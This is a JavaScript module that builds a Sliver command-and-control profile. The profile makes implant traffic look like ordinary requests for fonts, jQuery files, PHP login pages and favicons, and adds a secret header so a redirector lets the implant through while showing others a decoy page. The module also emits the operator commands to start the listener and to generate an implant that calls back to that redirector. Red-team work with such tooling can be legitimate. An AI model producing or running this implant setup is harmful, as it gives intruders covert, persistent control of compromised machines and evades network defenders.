import { requireHop1 } from './common.js';

// Sliver HTTP-C2 profile — standard Sliver http-c2 profile shape
// (implant_config + server_config). The callback host is not part of the
// profile; it goes on the generate command line, which we emit too.
export function build(chain, settings, options = {}) {
  const h = requireHop1(chain, settings, options);
  const content = JSON.stringify(
    {
      implant_config: {
        user_agent: h.userAgent,
        chrome_base_version: 126,
        macos_version: '10_15_7',
        url_parameters: null,
        headers: [{ name: h.secretHeader, value: h.secretValue }],
        max_files: 8,
        min_files: 2,
        max_paths: 8,
        min_paths: 2,
        stager_file_ext: '.woff',
        stager_files: [
          'attribute_text_w01_regular',
          'ZillaSlab-Regular.subset.bbc33fb47cf6',
          'ZillaSlab-Bold.subset.e96c15f68c68',
          'Inter-Regular',
          'Inter-Medium',
        ],
        stager_paths: ['static', 'assets', 'fonts', 'locales'],
        poll_file_ext: '.js',
        poll_files: ['bootstrap', 'bootstrap.min', 'jquery.min', 'jquery', 'route', 'app', 'app.min', 'script'],
        poll_paths: ['js', 'umd', 'assets', 'bundle', 'bundles', 'scripts', 'javascript'],
        start_session_file_ext: '.html',
        session_file_ext: '.php',
        session_files: ['login', 'signin', 'api', 'samples', 'rpc', 'index', 'admin', 'register'],
        session_paths: ['php', 'api', 'upload', 'actions', 'rest', 'v1', 'auth', 'authenticate', 'oauth2'],
        close_file_ext: '.png',
        close_files: ['favicon', 'sample', 'example'],
        close_paths: ['static', 'www', 'assets', 'images', 'icons'],
      },
      server_config: {
        random_version_headers: false,
        headers: [],
        cookies: ['PHPSESSID', 'SID', 'SSID', 'APISID', 'csrf-state', 'AWSALBCORS'],
      },
    },
    null,
    2
  );

  return {
    framework: 'sliver',
    filename: `${chain.name}-sliver-http-c2.json`,
    language: 'json',
    content,
    commands: [
      `# on the sliver server: start the listener bound for the tunnel/local service`,
      `http --lhost 0.0.0.0 --lport 8443`,
      `# generate an implant pointed at hop 1 with this profile:`,
      `generate --http ${h.url} --http-c2-profile ${chain.name}-sliver-http-c2.json --skip-symbols`,
    ],
    notes: [
      'The secret header must be present in the profile or hop 1 will serve the disguise page to the implant.',
      'The listener stays on the C2 box (direct) or behind the tunnel (tunnel mode) — never expose it publicly.',
    ],
  };
}
